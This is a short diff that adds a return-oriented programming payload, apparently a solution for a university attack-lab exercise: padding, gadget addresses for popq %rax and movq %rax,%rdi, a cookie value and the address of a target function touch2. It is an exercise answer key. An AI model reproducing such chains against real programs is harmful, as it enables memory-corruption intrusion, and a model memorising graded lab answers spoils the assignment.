@@ -68,6 +68,12 @@ b4 1e 42 00 00 00 00 00 # 421eb4: 58 (popq $rax)
 9a d9 e2 68 00 00 00 00 # cookie
 4e 1d 42 00 00 00 00 00 # address <touch2> 0x421d4e
 
+xx xx xx xx xx xx xx xx # padding 24 bytes
+b4 1e 42 00 00 00 00 00 # 421eb4: 58 (popq $rax)
+9a d9 e2 68 00 00 00 00 # cookie
+b9 1e 42 00 00 00 00 00 # 421eb9: 48 89 c7 (movq $rax, $rdi)
+4e 1d 42 00 00 00 00 00 # address <touch2> 0x421d4e
+
 61 61 61 61 61 61
 61 61 61 61 61 61
 61 61 61 61 61 61
